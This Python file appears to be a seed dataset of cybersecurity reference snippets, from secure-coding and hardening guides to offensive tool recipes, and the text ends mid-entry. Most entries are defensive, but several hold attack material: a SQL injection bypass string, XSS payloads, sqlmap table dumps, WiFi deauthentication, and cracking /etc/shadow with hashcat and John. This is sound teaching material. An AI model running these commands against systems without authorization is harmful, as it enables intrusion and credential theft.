"""Cybersecurity reference patterns — OWASP, secure coding, crypto, auth,
network & host hardening, pentest tooling (for AUTHORIZED testing only —
your own systems, lab VMs, CTFs, or engagements with written scope),
CTF / reverse engineering, blue-team / IR, cloud & container security.

Indexed by natural-language request.
"""
from __future__ import annotations


CYBERSECURITY_SEED: list[dict] = [

# ───────── Orientation ─────────
{
    "request": "cybersecurity domains overview — what to learn when",
    "language": "text", "framework": "security",
    "code": """APPSEC / WEB SEC      — OWASP Top 10, secure coding, code review, SAST/DAST
                          Tools: Burp, ZAP, semgrep, sqlmap, ffuf
NETWORK SEC           — recon, segmentation, firewalls, IDS/IPS, mTLS
                          Tools: nmap, wireshark, tcpdump, suricata, zeek
HOST / OS HARDENING   — CIS benchmarks, SELinux/AppArmor, auditd, kernel params
CRYPTO                — TLS, key mgmt, hashing, AEAD, KDFs, signing
IAM / AUTHN-AUTHZ     — OAuth2/OIDC, SAML, JWT, sessions, MFA, RBAC/ABAC
CLOUD SEC             — IAM least-priv, SCPs, CSPM, secrets mgmt, KMS
CONTAINER / K8S       — image scanning, admission, NetworkPolicy, Pod Security
RED TEAM / PENTEST    — recon, exploit, post-exploit, reporting (authorized)
BLUE TEAM / SOC       — SIEM, EDR, threat hunting, IR, forensics
THREAT INTEL          — IoCs, MITRE ATT&CK, TTPs, attribution
GRC / COMPLIANCE      — SOC2, ISO27001, PCI, HIPAA, NIST CSF
REVERSE ENG / MALWARE — Ghidra, radare2, IDA, sandboxes, YARA
CTF                   — pwn, web, crypto, forensics, RE, OSINT, misc

ETHICS NOTE — only test systems you own or have written authorization for.""",
},
{
    "request": "MITRE ATT&CK framework overview",
    "language": "text", "framework": "threat-intel",
    "code": """ATT&CK = adversary Tactics, Techniques, Procedures matrix.

14 tactics (the "why" — phases of an attack):
  Reconnaissance, Resource Development, Initial Access, Execution, Persistence,
  Privilege Escalation, Defense Evasion, Credential Access, Discovery,
  Lateral Movement, Collection, Command & Control, Exfiltration, Impact

Each has techniques (T1234) and sub-techniques (T1234.001).

Use it to:
  - Map detections and gaps (D3FEND for defenses)
  - Tag IR findings with technique IDs
  - Build adversary emulation plans (Atomic Red Team, Caldera, Stratus)
  - Run purple team exercises

References:
  attack.mitre.org
  github.com/redcanaryco/atomic-red-team
  github.com/center-for-threat-informed-defense""",
},

# ───────── OWASP Top 10 ─────────
{
    "request": "OWASP Top 10 (2021) cheat sheet",
    "language": "text", "framework": "appsec",
    "code": """A01 Broken Access Control     — IDOR, missing authz, path traversal, force-browsing
A02 Cryptographic Failures    — plaintext secrets, weak ciphers, bad randomness, no TLS
A03 Injection                 — SQLi, NoSQLi, OS cmd, LDAP, XPath, XSS (reflected/stored/DOM)
A04 Insecure Design           — missing rate limit, no threat model, business-logic flaws
A05 Security Misconfiguration — default creds, verbose errors, open S3, missing headers
A06 Vulnerable Components     — outdated libs, known CVEs, unmaintained deps
A07 Identification & Authn    — credential stuffing, weak passwords, broken MFA, session fixation
A08 Software & Data Integrity — unsigned updates, CI/CD compromise, deserialization
A09 Logging & Monitoring      — missing audit log, no alerting, no centralized SIEM
A10 SSRF                      — server fetches attacker URL, hits internal metadata svc

Defenses:
  parameterize queries, contextual output encoding, allowlist input,
  CSP + Trusted Types, mTLS, signed artifacts, central authz layer,
  short JWT lifetimes, rotate secrets, scan deps weekly.""",
},

# ───────── SQL injection ─────────
{
    "request": "SQL injection: vulnerable vs safe code",
    "language": "py", "framework": "appsec",
    "code": """# ❌ VULNERABLE — string interpolation
def login_bad(email, pw):
    cur.execute(f"SELECT id FROM users WHERE email='{email}' AND pw='{pw}'")

# Attack:  email = "x' OR 1=1 --"   →  bypasses auth

# ✅ SAFE — parameterized query
def login_good(email, pw):
    cur.execute("SELECT id FROM users WHERE email = %s AND pw = %s", (email, pw))

# ✅ SAFE — ORM (SQLAlchemy)
session.query(User).filter_by(email=email).first()

# Defense in depth:
#   - DB user has minimum privs (no DROP, no FILE)
#   - WAF (ModSecurity / CRS) catches obvious payloads
#   - Log + alert on UNION SELECT, sleep(), benchmark()
#   - Static analysis: semgrep p/sql-injection""",
},
{
    "request": "sqlmap basic usage for authorized testing",
    "language": "bash", "framework": "pentest",
    "code": """# Probe a parameter
sqlmap -u "https://target.test/item?id=1" --batch --level=3 --risk=2

# POST data
sqlmap -u "https://target.test/login" --data="user=a&pass=b" --batch

# With session cookie (post-login)
sqlmap -u "https://target.test/profile?uid=1" --cookie="session=abc..." --batch

# Enumerate
sqlmap -u "..." --dbs                          # list DBs
sqlmap -u "..." -D appdb --tables              # list tables
sqlmap -u "..." -D appdb -T users --columns
sqlmap -u "..." -D appdb -T users --dump

# Through Burp request file (recommended — captures all headers)
sqlmap -r request.txt --batch --random-agent --tamper=between,space2comment

# Use ONLY against systems you own or have written authorization for.""",
},

# ───────── XSS ─────────
{
    "request": "XSS: types, payloads, defenses",
    "language": "text", "framework": "appsec",
    "code": """Types:
  Reflected — payload in URL, bounced back unsanitized
  Stored    — payload saved (comment, profile) and rendered to others
  DOM       — sink in client JS (innerHTML, eval, document.write) reads from source (location, postMessage)

Defenses (in priority order):
  1. Contextual output encoding — HTML body, attribute, JS string, URL, CSS each need different escaping
  2. Use a templating engine that auto-escapes (React, Jinja2 autoescape, Thymeleaf)
  3. Avoid dangerous sinks — innerHTML → textContent, eval → JSON.parse
  4. CSP with nonces or hashes — Content-Security-Policy: script-src 'nonce-RANDOM'; object-src 'none'; base-uri 'none'
  5. Trusted Types (Chrome) — require TrustedHTML for sinks
  6. HttpOnly + Secure + SameSite=Lax cookies → can't be stolen via JS

DON'T rely on input filtering / blocklists — bypassed easily.

Test payloads (lab only):
  <script>alert(1)</script>
  "><img src=x onerror=alert(1)>
  javascript:alert(1)
  <svg onload=alert(1)>""",
},
{
    "request": "Content-Security-Policy strict template",
    "language": "text", "framework": "appsec",
    "code": """# Strict, nonce-based CSP — blocks inline JS unless nonce matches
Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-{RANDOM_PER_RESPONSE}' 'strict-dynamic' https:;
  style-src 'self' 'nonce-{RANDOM}';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'none';
  form-action 'self';
  upgrade-insecure-requests;
  report-to csp-endpoint

# Reporting
Reporting-Endpoints: csp-endpoint="https://example.com/csp-report"

# Roll out:
#   1. Deploy in Content-Security-Policy-Report-Only first
#   2. Watch reports, fix violations
#   3. Switch to enforcing
#   4. Add Trusted Types: require-trusted-types-for 'script';""",
},

# ───────── CSRF ─────────
{
    "request": "CSRF protection patterns",
    "language": "text", "framework": "appsec",
    "code": """CSRF = victim's browser tricked into making authenticated request.

Defenses (use multiple):
  1. SameSite=Lax (default) or SameSite=Strict cookies — kills cross-site cookie sending
  2. Anti-CSRF token — random per-session value in form + cookie, server compares
     (synchronizer pattern; or signed double-submit cookie if no server session)
  3. Origin / Referer header check on state-changing requests
  4. Require re-auth for sensitive ops (payment, password change)
  5. Use SPA + bearer tokens (Authorization header) — not auto-sent by browser
  6. CORS with credentials: only allow trusted origins, never '*'

Don't:
  - rely on custom headers alone (preflight-bypass with simple content types possible)
  - trust GET requests to mutate state — make them POST/PUT/DELETE only

Frameworks:
  Django CSRF middleware, Rails protect_from_forgery, Spring CsrfFilter,
  Express csurf (deprecated — use SameSite + double-submit instead)""",
},

# ───────── SSRF ─────────
{
    "request": "SSRF prevention (and IMDS protection)",
    "language": "py", "framework": "appsec",
    "code": """# Server-Side Request Forgery: app fetches attacker-controlled URL
# Attack target: internal services, cloud metadata (169.254.169.254), localhost

# ❌ VULNERABLE
def fetch_avatar(url):
    return requests.get(url).content

# ✅ SAFE — allowlist + DNS pinning + redirect handling
import ipaddress, socket
from urllib.parse import urlparse

ALLOWED_HOSTS = {"cdn.example.com", "images.example.com"}

def safe_fetch(url, max_size=5 * 1024 * 1024):
    p = urlparse(url)
    if p.scheme not in {"http", "https"}: raise ValueError("scheme")
    if p.hostname not in ALLOWED_HOSTS: raise ValueError("host")

    # Resolve and check IP isn't private/link-local/loopback (TOCTOU mitigation
    # below: pin the resolved IP into the request)
    ip = socket.gethostbyname(p.hostname)
    addr = ipaddress.ip_address(ip)
    if addr.is_private or addr.is_loopback or addr.is_link_local or addr.is_reserved:
        raise ValueError("blocked range")

    r = requests.get(url, allow_redirects=False, timeout=5, stream=True)
    if int(r.headers.get("content-length", 0)) > max_size: raise ValueError("too large")
    return r.content

# Cloud: use IMDSv2 (token-required) on AWS — IMDSv1 is the canonical SSRF pivot
#   aws ec2 modify-instance-metadata-options --http-tokens required --http-endpoint enabled""",
},

# ───────── IDOR ─────────
{
    "request": "IDOR (Insecure Direct Object Reference) and authorization patterns",
    "language": "py", "framework": "appsec",
    "code": """# IDOR = user accesses another user's resource by changing an ID

# ❌ VULNERABLE
@app.get("/api/orders/<int:order_id>")
def get_order(order_id):
    return Order.query.get(order_id).to_dict()  # any logged-in user can read any order

# ✅ SAFE — scope by owner
@app.get("/api/orders/<int:order_id>")
@login_required
def get_order(order_id):
    o = Order.query.filter_by(id=order_id, user_id=current_user.id).first_or_404()
    return o.to_dict()

# Better: central authz policy
def can(user, action, resource):
    if action == "read" and resource.kind == "order":
        return resource.user_id == user.id or user.is_admin
    return False

@app.get("/api/orders/<int:order_id>")
def get_order(order_id):
    o = Order.query.get_or_404(order_id)
    if not can(current_user, "read", o): abort(403)
    return o.to_dict()

# Patterns:
#   - Use opaque/random IDs (UUIDv4, ULID) — slows enumeration but NOT a substitute for authz
#   - OPA / Cedar / Oso for declarative policies
#   - Test: list every endpoint and verify horizontal + vertical authz""",
},

# ───────── Auth ─────────
{
    "request": "password storage — hashing with argon2id",
    "language": "py", "framework": "auth",
    "code": """# ❌ NEVER: md5, sha1, sha256-of-password (no salt, no work factor)
# ✅ Use argon2id (preferred) or bcrypt or scrypt

# argon2-cffi
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError

ph = PasswordHasher(time_cost=3, memory_cost=64*1024, parallelism=4)

def hash_pw(pw: str) -> str:
    return ph.hash(pw)

def verify_pw(stored_hash: str, pw: str) -> bool:
    try:
        ph.verify(stored_hash, pw)
        if ph.check_needs_rehash(stored_hash):
            # re-hash with current params on next login
            ...
        return True
    except VerifyMismatchError:
        return False

# Targets (OWASP 2024):
#   argon2id: m=64MiB, t=3, p=4   (or m=19MiB, t=2 minimum)
#   bcrypt:   cost ≥ 12
#   scrypt:   N=2^17, r=8, p=1

# Always:
#   - per-password random salt (libraries handle this)
#   - constant-time compare (libraries handle this)
#   - rate-limit logins, lockout after N failures
#   - never log the password or hash""",
},
{
    "request": "JWT — secure usage and pitfalls",
    "language": "text", "framework": "auth",
    "code": """JWT = base64url(header).base64url(payload).signature

DO:
  - HS256 with a long secret (≥256 bits) OR RS256/EdDSA with key pair
  - Short lifetime (≤15 min for access tokens), refresh tokens for long sessions
  - Validate: signature, exp, nbf, iss, aud, sub
  - Store on client: secure httpOnly cookie (SameSite=Lax) — NOT localStorage if possible
  - Rotate signing keys; publish via JWKS (/.well-known/jwks.json) for asymmetric
  - Include `jti` if you need revocation, track revoked jtis in Redis until exp

DON'T:
  - Accept alg="none" — explicitly reject in code
  - Allow alg confusion (RS256 → HS256 with public key as secret) — check alg matches expected
  - Put sensitive data (PII, perms beyond what's needed) in payload — it's only base64
  - Use long-lived JWTs as the only auth — they're hard to revoke

Code (PyJWT):
  import jwt
  token = jwt.encode({"sub": user.id, "exp": now+900}, KEY, algorithm="HS256")
  payload = jwt.decode(token, KEY, algorithms=["HS256"], audience="api", issuer="auth.example.com")""",
},
{
    "request": "OAuth2 / OIDC flow choice guide",
    "language": "text", "framework": "auth",
    "code": """Authorization Code + PKCE (default for everything now)
  Use for:  SPAs, mobile apps, native apps, server-side web apps
  Why:      Code exchange happens server-to-server, PKCE prevents code interception

Client Credentials
  Use for:  service-to-service, no user involved
  Flow:     POST /token  client_id+client_secret  →  access_token

Device Code
  Use for:  TVs, CLIs, devices without browser
  Flow:     show user_code + verification_uri, user logs in elsewhere, poll /token

Resource Owner Password (ROPC)
  Use for:  AVOID. Legacy migration only. User gives password to client.

Implicit
  DEPRECATED. Don't use. Replaced by Code+PKCE.

OIDC adds id_token (JWT proving identity) on top of OAuth2 (which only proves authorization).

Always:
  - Validate state param (CSRF on the redirect)
  - Validate PKCE code_verifier
  - Validate id_token signature, iss, aud, nonce, exp
  - Use short-lived access tokens, rotating refresh tokens""",
},
{
    "request": "session cookie security flags",
    "language": "text", "framework": "auth",
    "code": """Set-Cookie: session=...; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600

Secure       — only sent over HTTPS
HttpOnly     — not readable by document.cookie (XSS can't steal it directly)
SameSite=Lax — sent on top-level navigations only (CSRF mitigation)
SameSite=Strict — never sent cross-site (breaks SSO redirects sometimes)
SameSite=None; Secure — required for cross-site (must pair with Secure)
__Host- prefix — Path=/, Secure, no Domain → browser enforces stricter rules
Max-Age / Expires — bound the lifetime; rotate on login + privilege change

Server side:
  - Regenerate session ID on login (prevent fixation)
  - Bind session to user-agent + IP /24 (loose) — invalidate on mismatch
  - Idle timeout (e.g. 30 min) + absolute timeout (e.g. 12 h)
  - Logout clears server-side store; don't rely on cookie deletion""",
},

# ───────── Crypto ─────────
{
    "request": "modern crypto choices cheat sheet",
    "language": "text", "framework": "crypto",
    "code": """SYMMETRIC ENCRYPTION
  Use:   AES-256-GCM  or  ChaCha20-Poly1305 (AEAD — auth + encryption together)
  Avoid: AES-CBC (use only with HMAC + careful padding), AES-ECB (never)

ASYMMETRIC ENCRYPTION
  Use:   X25519 ECDH for key agreement; AES-GCM for the data
  RSA:   only OAEP padding, ≥3072-bit keys

SIGNATURES
  Use:   Ed25519 (preferred), or ECDSA P-256
  RSA:   PSS padding, ≥3072-bit keys

HASHING
  Use:   SHA-256 / SHA-512 / BLAKE2b / BLAKE3
  Avoid: MD5, SHA-1 (collisions found)

PASSWORD HASHING (different from regular hash!)
  Use:   argon2id, bcrypt, scrypt
  Never: SHA-256 of password

KDF (derive key from secret)
  Use:   HKDF-SHA256 (from random keys), argon2id (from passwords)

RANDOMNESS
  Use:   /dev/urandom, secrets module (Py), crypto.randomBytes (Node), os.urandom
  Never: random / Math.random / rand() for secrets

LIBRARIES
  libsodium / NaCl — high-level, hard to misuse
  Tink — Google, prefers safe defaults
  cryptography (Py) — modern, audited
  age — file encryption replacement for GPG""",
},
{
    "request": "AES-GCM encryption in Python (cryptography lib)",
    "language": "py", "framework": "crypto",
    "code": """import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Key generation (store securely — KMS, sealed vault)
key = AESGCM.generate_key(bit_length=256)
aesgcm = AESGCM(key)

# Encrypt
nonce = os.urandom(12)              # 96-bit nonce, NEVER reuse with same key
aad = b"user_id:42"                 # associated data (not encrypted, but authenticated)
ciphertext = aesgcm.encrypt(nonce, b"secret data", aad)

# Store: nonce || ciphertext  (or separately, just bind them)
blob = nonce + ciphertext

# Decrypt
nonce, ct = blob[:12], blob[12:]
plaintext = aesgcm.decrypt(nonce, ct, aad)   # raises InvalidTag on tamper

# Key rotation: encrypt new data with new key, keep old keys until all data re-encrypted.
# Use a key-id prefix in the blob so you know which key to use.""",
},
{
    "request": "TLS / SSL configuration hardening",
    "language": "text", "framework": "crypto",
    "code": """Modern profile (Mozilla SSL Config Generator → "Modern"):
  Protocols:    TLS 1.3 only (TLS 1.2 OK for compat)
  Disable:      SSLv2, SSLv3, TLS 1.0, TLS 1.1
  Ciphers:      TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256
                ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:...
  Curves:       X25519, prime256v1, secp384r1
  HSTS:         Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
  OCSP staple:  on
  Cert:         ECDSA P-256 (smaller/faster) or RSA 3072+
  Renew:        Let's Encrypt + certbot, 90-day cert, auto-renew

Test: testssl.sh, ssllabs.com/ssltest, hardenize.com

Nginx:
  ssl_protocols TLSv1.3 TLSv1.2;
  ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:...;
  ssl_prefer_server_ciphers off;
  ssl_session_cache shared:SSL:10m;
  ssl_stapling on;
  ssl_stapling_verify on;
  add_header Strict-Transport-Security "max-age=63072000; includeSubDomains" always;""",
},
{
    "request": "generate self-signed cert and CA for local dev",
    "language": "bash", "framework": "crypto",
    "code": """# Local CA (mkcert is easiest — auto-trusts in browsers/keychain)
brew install mkcert nss   # or apt
mkcert -install
mkcert example.test "*.example.test" localhost 127.0.0.1 ::1
# → example.test+3.pem  example.test+3-key.pem

# Manual root CA + server cert (openssl)
openssl genrsa -out ca.key 4096
openssl req -x509 -new -nodes -key ca.key -sha256 -days 3650 \\
  -subj "/CN=Dev Root CA" -out ca.crt

# Server key + CSR
openssl genrsa -out server.key 2048
cat > san.cnf <<EOF
[req]
distinguished_name=req
req_extensions=v3
[v3]
subjectAltName=DNS:example.test,DNS:*.example.test,IP:127.0.0.1
EOF
openssl req -new -key server.key -subj "/CN=example.test" -config san.cnf -out server.csr

# Sign with CA
openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial \\
  -out server.crt -days 825 -sha256 -extfile san.cnf -extensions v3

# Trust ca.crt locally (Linux):
sudo cp ca.crt /usr/local/share/ca-certificates/ && sudo update-ca-certificates""",
},

# ───────── Security headers ─────────
{
    "request": "HTTP security headers — full set",
    "language": "text", "framework": "appsec",
    "code": """Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'nonce-XXX' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY                    # legacy; CSP frame-ancestors supersedes
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=(), interest-cohort=()
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp     # only if you cross-origin-isolate
Cross-Origin-Resource-Policy: same-origin
Cache-Control: no-store                  # for sensitive responses

REMOVE:
  Server: nginx/1.x.x  (set server_tokens off)
  X-Powered-By: ...
  X-AspNet-Version: ...

Test: securityheaders.com, observatory.mozilla.org""",
},
{
    "request": "CORS — safe configuration",
    "language": "py", "framework": "appsec",
    "code": """# Wrong: Access-Control-Allow-Origin: *  with credentials → blocked by browser
# Wrong: reflect arbitrary Origin without allowlist → CSRF risk
# Wrong: Access-Control-Allow-Origin: null

# ✅ Allowlist of trusted origins, only echo on match
ALLOWED = {"https://app.example.com", "https://admin.example.com"}

@app.after_request
def cors(resp):
    origin = request.headers.get("Origin")
    if origin in ALLOWED:
        resp.headers["Access-Control-Allow-Origin"] = origin
        resp.headers["Vary"] = "Origin"
        resp.headers["Access-Control-Allow-Credentials"] = "true"
        resp.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, DELETE"
        resp.headers["Access-Control-Allow-Headers"] = "Authorization, Content-Type"
        resp.headers["Access-Control-Max-Age"] = "600"
    return resp

# Preflight (OPTIONS) responses must also include these headers.
# If you use cookies, you MUST set Access-Control-Allow-Credentials: true AND
# the Origin must be a specific origin (not *).""",
},

# ───────── Linux hardening ─────────
{
    "request": "Linux server hardening checklist",
    "language": "bash", "framework": "host-sec",
    "code": """# 1. Updates
apt update && apt -y full-upgrade
apt install -y unattended-upgrades && dpkg-reconfigure -plow unattended-upgrades

# 2. SSH
# /etc/ssh/sshd_config:
#   Port 2222                # optional, security through obscurity
#   PermitRootLogin no
#   PasswordAuthentication no
#   PubkeyAuthentication yes
#   AllowUsers deploy
#   MaxAuthTries 3
#   ClientAliveInterval 300
sudo systemctl reload ssh

# 3. Firewall (ufw / nftables)
ufw default deny incoming
ufw default allow outgoing
ufw allow 2222/tcp
ufw allow 443/tcp
ufw enable

# 4. fail2ban
apt install -y fail2ban
# /etc/fail2ban/jail.local — enable [sshd], bantime=24h, maxretry=3

# 5. Auditd / process accounting
apt install -y auditd
auditctl -w /etc/passwd -p wa -k passwd_changes
auditctl -w /etc/shadow -p wa -k shadow_changes

# 6. AppArmor / SELinux — keep enforcing
aa-status        # ubuntu/debian
sestatus         # rhel/fedora

# 7. Kernel hardening (sysctl)
# /etc/sysctl.d/99-hardening.conf:
#   net.ipv4.tcp_syncookies=1
#   net.ipv4.conf.all.rp_filter=1
#   net.ipv4.conf.all.accept_source_route=0
#   net.ipv4.conf.all.accept_redirects=0
#   net.ipv4.conf.all.log_martians=1
#   kernel.kptr_restrict=2
#   kernel.dmesg_restrict=1
#   kernel.yama.ptrace_scope=2
#   fs.suid_dumpable=0
sysctl -p

# 8. Run CIS benchmark
# https://github.com/ovh/debian-cis  or  Lynis: lynis audit system""",
},
{
    "request": "SSH key best practices",
    "language": "bash", "framework": "host-sec",
    "code": """# Generate Ed25519 key (preferred — fast, small, modern)
ssh-keygen -t ed25519 -a 100 -C "you@laptop"
# -a 100  = 100 KDF rounds (slows brute force on stolen private key)

# RSA only if Ed25519 unsupported (legacy)
ssh-keygen -t rsa -b 4096 -a 100

# Use ssh-agent (don't keep keys decrypted on disk)
eval "$(ssh-agent -s)"
ssh-add -t 4h ~/.ssh/id_ed25519        # auto-forget after 4h

# Per-host config (~/.ssh/config)
Host bastion
  HostName bastion.example.com
  User deploy
  IdentityFile ~/.ssh/id_ed25519_work
  IdentitiesOnly yes
  AddKeysToAgent yes

Host prod-*
  ProxyJump bastion
  User deploy

# Hardware-backed keys (preferred for high-value access)
ssh-keygen -t ed25519-sk -O resident -O verify-required    # FIDO2 / YubiKey

# CA-signed certs instead of static keys (scales to many hosts)
# - User cert: ssh-keygen -s ca -I user@example -n alice -V +1d id_ed25519.pub
# - On servers: TrustedUserCAKeys /etc/ssh/ca.pub""",
},

# ───────── Network recon ─────────
{
    "request": "nmap — common scan recipes (authorized targets only)",
    "language": "bash", "framework": "pentest",
    "code": """# Discovery only (no port scan)
nmap -sn 10.0.0.0/24

# Top 1000 TCP ports, service+version, OS, default scripts
sudo nmap -sS -sV -O -sC -T4 -oA scan_basic 10.0.0.5

# Full TCP, all 65535 ports
sudo nmap -p- -T4 --min-rate 1000 -oA scan_full 10.0.0.5

# UDP top 100 (slow!)
sudo nmap -sU --top-ports 100 -T4 10.0.0.5

# Vuln scripts (NSE)
nmap --script vuln 10.0.0.5
nmap --script "http-* and not intrusive" -p80,443 target

# Aggressive (= -A: OS, version, scripts, traceroute)
sudo nmap -A -T4 target

# Web stack fingerprint
nmap -p80,443 --script http-title,http-server-header,http-headers,ssl-cert,ssl-enum-ciphers target

# Output formats
nmap ... -oA basename       # writes basename.{nmap,gnmap,xml}

# Scope ALWAYS — only run against hosts you own or have written authorization for.""",
},
{
    "request": "wireshark / tcpdump capture filters cheat sheet",
    "language": "bash", "framework": "netsec",
    "code": """# Capture (BPF filter — runs in kernel)
sudo tcpdump -i eth0 -nn -s0 -w cap.pcap 'host 10.0.0.5 and port 443'
sudo tcpdump -i any 'tcp port 80 or tcp port 443'
sudo tcpdump -i eth0 'port not 22'                  # exclude ssh
sudo tcpdump -i eth0 'icmp'

# Display filter (Wireshark — different syntax)
http.request.method == "POST"
ip.addr == 10.0.0.5 and tcp.port == 443
tls.handshake.type == 1                              # ClientHello
http contains "password"
dns.qry.name contains "example"

# Decrypt TLS (with key log file)
# 1. export SSLKEYLOGFILE=/tmp/keys.log  in browser/curl
# 2. Wireshark → Preferences → Protocols → TLS → (Pre)-Master-Secret log

# Quick CLI extraction
tshark -r cap.pcap -Y 'http.request' -T fields -e ip.src -e http.host -e http.request.uri
tshark -r cap.pcap -q -z conv,tcp                   # connection summary""",
},

# ───────── Web testing tools ─────────
{
    "request": "Burp Suite essential workflow",
    "language": "text", "framework": "pentest",
    "code": """1. Configure browser proxy → 127.0.0.1:8080, install Burp's CA in browser
2. Browse the app — Burp builds the site map under Target → Site map
3. Scope: right-click host → Add to scope; set Target → Scope → "show only in-scope"
4. Audit: Repeater (manual), Intruder (parameter fuzzing), Scanner (Pro only)

Repeater workflow:
  - Right-click an interesting request → Send to Repeater
  - Tweak headers/body, click Send, diff response

Intruder modes:
  - Sniper:        one position, one wordlist (param fuzzing)
  - Battering ram: same payload in many positions
  - Pitchfork:     parallel wordlists across positions
  - Cluster bomb:  cartesian product (slow but thorough)

Useful extensions (BApp Store):
  Logger++, Autorize (authz testing), Param Miner, Turbo Intruder,
  JWT Editor, J2EEScan, Backslash Powered Scanner, Active Scan++

Free alternative: OWASP ZAP — similar features, scriptable, automated baseline scans:
  zap-baseline.py -t https://target.test -r report.html""",
},
{
    "request": "ffuf / gobuster — directory and parameter fuzzing",
    "language": "bash", "framework": "pentest",
    "code": """# ffuf — fast web fuzzer
# Directory brute force
ffuf -u https://target.test/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
     -mc 200,204,301,302,401,403 -fs 0 -recursion -recursion-depth 2

# Subdomain (vhost)
ffuf -u https://target.test -H "Host: FUZZ.target.test" \\
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1234

# Parameter discovery
ffuf -u "https://target.test/api/item?FUZZ=1" \\
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fc 404

# Value fuzzing (e.g. hidden id)
ffuf -u "https://target.test/api/item?id=FUZZ" -w ids.txt -fr "Not found"

# Filters: -fc (status), -fs (size), -fw (words), -fl (lines), -fr (regex)
# Matchers: -mc, -ms, -mr (opposite of f-)

# gobuster (similar)
gobuster dir -u https://target.test -w wordlist.txt -x php,html,txt -t 50
gobuster dns -d target.test -w subdomains.txt
gobuster vhost -u https://target.test -w subdomains.txt

# Wordlists: github.com/danielmiessler/SecLists""",
},
{
    "request": "nikto / wpscan — quick web checks",
    "language": "bash", "framework": "pentest",
    "code": """# nikto — old but still finds low-hanging fruit (versions, default files, headers)
nikto -h https://target.test -Tuning 123bde -output nikto.html -Format html

# Tuning numbers:
#   1=interesting files  2=misconfig  3=info disclosure  4=injection  5=remote retrieval
#   6=DoS (skip!)        7=exec       8=remote shell    9=SQLi       0=file upload
#   a=authn  b=software identification  c=remote source  d=other  e=reverse tuning

# wpscan — WordPress
wpscan --url https://target.test --enumerate vp,vt,u --random-user-agent --api-token YOUR_TOKEN
# vp=vuln plugins, vt=vuln themes, u=users

# whatweb / wappalyzer-cli — tech fingerprinting
whatweb -a 3 https://target.test""",
},

# ───────── Wireless ─────────
{
    "request": "WiFi password recovery for your own network",
    "language": "bash", "framework": "wireless",
    "code": """# 1. ON YOUR ACTIVE MACHINE — read the saved password
# Linux (NetworkManager)
sudo cat /etc/NetworkManager/system-connections/*.nmconnection | grep -E '^(ssid|psk)='
nmcli -s -g 802-11-wireless-security.psk connection show "YourSSID"

# Windows (PowerShell as admin)
netsh wlan show profile name="YourSSID" key=clear | findstr "Key Content"

# macOS
security find-generic-password -ga "YourSSID"

# 2. ON YOUR ROUTER — log in to admin UI
#    Usually http://192.168.0.1 or http://192.168.1.1
#    Default creds on the sticker on the bottom of the router
#    Wireless → Security → SSID/passphrase visible after login

# 3. PRESS THE WPS BUTTON if router supports it — temporarily prints/exposes the key.

# Recovering a WPA2 handshake on YOUR OWN network (lab/testing):
#   sudo airmon-ng start wlan0
#   sudo airodump-ng -c <ch> --bssid <your_bssid> -w cap wlan0mon
#   # Wait for a client handshake (or briefly deauth your own client to force one)
#   sudo aireplay-ng -0 1 -a <your_bssid> -c <your_client_mac> wlan0mon
#   hashcat -m 22000 cap.hccapx wordlist.txt
# Convert: hcxpcapngtool -o cap.hc22000 cap.pcapng

# DO NOT do any of this against networks you don't own / aren't authorized to test.""",
},

# ───────── Password attacks ─────────
{
    "request": "hashcat — common modes for password recovery",
    "language": "bash", "framework": "pentest",
    "code": """# Modes (-m):
#   0     MD5
#   100   SHA1
#   1400  SHA256
#   1800  sha512crypt   ($6$)
#   1700  SHA512
#   3200  bcrypt        ($2*$)
#   500   md5crypt      ($1$)
#   7400  sha256crypt   ($5$)
#   13100 Kerberos TGS-REP (kerberoast)
#   18200 Kerberos AS-REP
#   22000 WPA-PBKDF2 / WPA-PMKID
#   2500  WPA-EAPOL (legacy hccapx)
#   16800 WPA-PMKID-PBKDF2

# Attack modes (-a):
#   0  straight (wordlist)
#   1  combination (wordlist1 + wordlist2)
#   3  brute force / mask
#   6  hybrid wordlist + mask
#   7  hybrid mask + wordlist

# Wordlist + rules
hashcat -m 0 -a 0 hashes.txt rockyou.txt -r rules/best64.rule -O

# Mask (?l lower ?u upper ?d digit ?s special ?a all)
hashcat -m 0 -a 3 hashes.txt '?u?l?l?l?l?d?d?d?d'

# Hybrid: wordlist + 4-digit suffix
hashcat -m 0 -a 6 hashes.txt rockyou.txt '?d?d?d?d'

# Show cracked
hashcat -m 0 hashes.txt --show

# Performance
#   --benchmark
#   -O optimized kernels (faster, may limit pw length)
#   -w 3 high workload

# Identify a hash type: hashid, name-that-hash, hashcat --identify""",
},
{
    "request": "John the Ripper — usage",
    "language": "bash", "framework": "pentest",
    "code": """# Auto-detect format, default wordlist + rules
john hashes.txt

# Specify format
john --format=sha512crypt hashes.txt

# Wordlist + rules
john --wordlist=rockyou.txt --rules=Jumbo hashes.txt

# Incremental (brute)
john --incremental=ASCII hashes.txt

# Show results
john --show hashes.txt

# /etc/shadow → format
unshadow /etc/passwd /etc/shadow > combo.txt
john combo.txt

# zip / pdf / office files
zip2john secret.zip > z.hash && john z.hash
pdf2john secret.pdf > p.hash && john p.hash
office2john secret.docx > o.hash && john o.hash

# SSH private key
